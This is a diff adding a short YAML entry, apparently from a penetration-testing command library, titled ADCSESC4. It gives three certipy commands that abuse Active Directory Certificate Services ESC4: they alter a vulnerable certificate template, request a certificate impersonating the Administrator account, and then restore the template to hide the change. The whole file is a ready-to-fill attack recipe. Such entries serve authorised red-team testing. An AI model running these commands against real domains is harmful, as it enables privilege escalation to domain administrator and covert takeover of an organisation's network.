@@ -1,0 +1,13 @@
+name: ADCSESC4
+description: ESC4 - Modify vulnerable certificate template
+commands:
+- '# Modify template to enable ESC1'
+- certipy template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -save-old
+- ''
+- '# Request certificate as admin'
+- certipy req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'Administrator@<DOMAIN>'
+- ''
+- '# Restore template'
+- certipy template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -configuration old-config.json
+opsec: []
+references: []
